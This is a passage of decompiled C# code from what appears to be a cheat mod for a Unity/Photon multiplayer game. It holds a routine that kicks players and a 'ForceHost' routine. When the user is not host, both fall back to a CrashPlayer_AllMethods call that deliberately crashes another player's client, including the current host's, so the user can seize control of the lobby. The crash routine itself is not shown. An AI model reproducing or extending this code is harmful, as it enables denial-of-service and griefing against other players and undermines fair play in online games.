			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || (((MonoBehaviourPun)target).photonView.IsMine && !includeSelf))
			{
				return;
			}
			try
			{
				Player owner = ((MonoBehaviourPun)target).photonView.Owner;
				if (owner == null)
				{
					return;
				}
				Debug.Log((object)("[Kick] Attempting to kick " + owner.NickName + " from lobby..."));
				if (PhotonNetwork.IsMasterClient)
				{
					try
					{
						PhotonNetwork.CloseConnection(owner);
						Debug.Log((object)("[Kick]  Closed connection to " + owner.NickName + " (Master Client)"));
						return;
					}
					catch (Exception ex)
					{
						Debug.LogWarning((object)("[Kick] CloseConnection failed: " + ex.Message));
					}
				}
				Debug.Log((object)("[Kick] Not master client - attempting to crash " + owner.NickName + " first..."));
				CrashPlayer_AllMethods(target);
			}
			catch (Exception ex2)
			{
				Debug.LogWarning((object)("[Kick] Kick failed: " + ex2.Message));
			}
		}

		public static void ForceHost()
		{
			try
			{
				if (!PhotonNetwork.InRoom)
				{
					Debug.LogWarning((object)"[Force Host] Not in a Photon room!");
					return;
				}
				if (PhotonNetwork.IsMasterClient)
				{
					Debug.Log((object)"[Force Host] Already master client!");
					return;
				}
				Player masterClient = PhotonNetwork.MasterClient;
				if (masterClient == null)
				{
					Debug.LogWarning((object)"[Force Host] No master client found!");
					return;
				}
				Debug.Log((object)("[Force Host] Current master client: " + masterClient.NickName));
				Character val = null;
				foreach (Character allCharacter in Character.AllCharacters)
				{
					if ((Object)(object)allCharacter != (Object)null && (Object)(object)((MonoBehaviourPun)allCharacter).photonView != (Object)null && ((MonoBehaviourPun)allCharacter).photonView.Owner != null && ((MonoBehaviourPun)allCharacter).photonView.Owner.ActorNumber == masterClient.ActorNumber)
					{
						val = allCharacter;
						break;
					}
				}
				if ((Object)(object)val != (Object)null)
				{
					Debug.Log((object)"[Force Host] Found master client character - attempting to crash them...");
					CrashPlayer_AllMethods(val);
				}
				else
				{
					Debug.LogWarning((object)"[Force Host] Could not find master client character");
				}
				Debug.Log((object)"[Force Host] Force host attempt initiated!");
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[Force Host] Error: " + ex.Message + "\n" + ex.StackTrace));
			}
		}
	}
}
